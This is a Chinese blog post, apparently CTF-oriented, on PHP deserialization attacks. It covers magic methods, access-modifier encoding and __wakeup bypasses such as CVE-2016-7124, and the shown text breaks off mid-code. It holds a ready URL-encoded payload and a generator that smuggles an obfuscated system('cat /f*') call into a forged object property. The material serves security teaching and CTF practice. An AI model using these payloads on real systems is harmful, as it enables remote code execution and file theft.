<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Php反序列化 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='代码审计, php安全' />
  <meta itemprop="name" content="php反序列化">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="1640">
  <meta itemprop="keywords" content="代码审计,Php安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/23/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="php反序列化">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="代码审计">
    <meta property="article:tag" content="Php安全">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="php反序列化">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/23/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/22/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/26/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "php反序列化",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/23\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  1640 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/23\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Php反序列化</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Php反序列化</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1640 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1700 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve-2016-7124">cve-2016-7124</a></li>
    <li><a href="#call">call</a></li>
    <li><a href="#引用">引用</a></li>
    <li><a href="#fast-destruct">fast-destruct</a></li>
    <li><a href="#php-issue9618">php issue#9618</a></li>
    <li><a href="#使用c绕过">使用C绕过</a></li>
  </ul>

  <ul>
    <li><a href="#漏洞利用条件">漏洞利用条件</a></li>
    <li><a href="#文件结构">文件结构</a></li>
    <li><a href="#生成phar">生成phar</a></li>
    <li><a href="#利用">利用</a>
      <ul>
        <li><a href="#触发phar的函数">触发phar的函数</a></li>
        <li><a href="#用法">用法</a></li>
      </ul>
    </li>
    <li><a href="#bypass">bypass</a></li>
    <li><a href="#010">010</a></li>
  </ul>

  <ul>
    <li><a href="#垃圾回收gc">垃圾回收GC</a></li>
    <li><a href="#fast-destruct-1">fast-destruct</a></li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#以强网杯2021-whereisuwebshell-为例">以强网杯2021 WhereIsUWebShell 为例</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="heading" class="heading-element"><span></span>
  <a href="#heading" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h1 id="序列化字符串" class="heading-element"><span>序列化字符串</span>
  <a href="#%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><blockquote>
<p><strong>序列化中各种数据表达方式</strong>在PHP中对不同类型的数据用不同的字母来标识：a - array(数组型) b - boolean（布尔型） d - double（双精度型） i - integer（整数型） o - common object（一般对象） r - reference（引用） s - string（字符型） C - custom object（自定义对象） O - class（类） N - null（空） R - pointer reference（指针、引用） U - unicode string（编码的字符串）</p>
</blockquote>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161545315.png" alt="image-20230316154540260" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161545315.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161545315.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161545315.png?size=large 2x" data-title="image-20230316154540260" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h1 id="魔法方法" class="heading-element"><span>魔法方法</span>
  <a href="#%e9%ad%94%e6%b3%95%e6%96%b9%e6%b3%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><pre tabindex="0"><code>__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数，session反序列化同样会调用
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发</code></pre><h1 id="tricks" class="heading-element"><span>tricks</span>
  <a href="#tricks" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><pre tabindex="0"><code>f1=[new mix(),get_flag]
($this-&gt;f1)()
[new mix(),&#39;get_flag&#39;]()</code></pre><h1 id="访问控制修饰符" class="heading-element"><span>访问控制修饰符</span>
  <a href="#%e8%ae%bf%e9%97%ae%e6%8e%a7%e5%88%b6%e4%bf%ae%e9%a5%b0%e7%ac%a6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>根据<strong>访问控制修饰符的不同</strong> 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">public</span>(<span style="color:#58a1dd">公有</span>) 
</span></span><span style="display:flex;"><span><span style="color:#ff636f">protected</span>(<span style="color:#58a1dd">受保护</span>)     <span style="color:#828b96;font-style:italic">// %00*%00属性名
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">private</span>(<span style="color:#58a1dd">私有的</span>)       <span style="color:#828b96;font-style:italic">// %00类名%00属性名
</span></span></span></code></pre></div><p>protected属性被序列化的时候<strong>属性值</strong>会变成**%00*%00属性名**</p>
<p>private属性被序列化的时候<strong>属性值</strong>会变成**%00类名%00属性名**</p>
<p><strong>（%00为空白符，空字符也有长度，一个空字符长度为 1）</strong></p>
<p>这个private伪造长记性</p>
<p>payload</p>
<pre tabindex="0"><code>root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=&#34;;s:12:&#34;%00push_it%00pwd&#34;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A13%3A%22%28%7E%8F%97%8F%96%91%99%90%29%28%29%3B%22%3B%7D</code></pre><p>这里发包的时候直接这个payload就可以，注意<code>%00push_it%00pwd</code>这个地方，%00就可以，发的时候整体不用解码</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212332829.webp" alt="image-20230721233214513" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212332829.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212332829.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307212332829.webp?size=large 2x" data-title="image-20230721233214513" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>private伪造实例</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">class</span> <span style="color:#58a1dd">pull_it</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$x</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(<span style="color:#58a1dd">$xx</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">x</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$xx</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">;s:12:</span><span style="color:#a6be9d">\&#34;\000</span><span style="color:#a6be9d">push_it</span><span style="color:#a6be9d">\000</span><span style="color:#a6be9d">pwd</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">serialize</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">pull_it</span>(<span style="color:#a6be9d">&#34;(~&#34;</span><span style="color:#ff636f">.~</span><span style="color:#a6be9d">&#34;system&#34;</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;)(~&#34;</span><span style="color:#ff636f">.~</span><span style="color:#a6be9d">&#34;cat /f*&#34;</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;);&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$c</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$b</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">urlencode</span>(<span style="color:#58a1dd">$c</span>));</span></span></code></pre></div><h1 id="绕过wakeup" class="heading-element"><span>绕过wakeup</span>
  <a href="#%e7%bb%95%e8%bf%87wakeup" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><a href="https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/"target="_blank" rel="external nofollow noopener noreferrer">PHP反序列化中wakeup()绕过总结</a></p>
<p><a href="https://www.viewofthai.link/2022/11/08/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8b%e7%bb%95%e8%bf%87wakeup/"target="_blank" rel="external nofollow noopener noreferrer">php反序列化之绕过wakeup</a></p>
<p><a href="https://www.jianshu.com/p/d73b3ca418b0"target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/d73b3ca418b0</a></p>
<p>一般来说，绕过wakup无非：</p>
<ul>
<li>cve-2016-7124：对象的属性数量大于真实值</li>
<li>引用</li>
<li>fast-destruct</li>
<li>使用C绕过</li>
</ul>
<h2 id="cve-2016-7124" class="heading-element"><span>cve-2016-7124</span>
  <a href="#cve-2016-7124" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>影响范围：</p>
<ul>
<li>PHP5 &lt; 5.6.25</li>
<li>PHP7 &lt; 7.0.10</li>
</ul>
<p><strong>当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</strong>。</p>
<h2 id="call" class="heading-element"><span>call</span>
  <a href="#call" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>7.4.x -7.4.30</li>
<li>8.0.x</li>
</ul>
<p><a href="https://github.com/php/php-src/issues/9618"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/php/php-src/issues/9618</a></p>
<p>执行顺序__call-&gt;des-&gt;__wakeup</p>
<h2 id="引用" class="heading-element"><span>引用</span>
  <a href="#%e5%bc%95%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。</p>
<p>比如：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
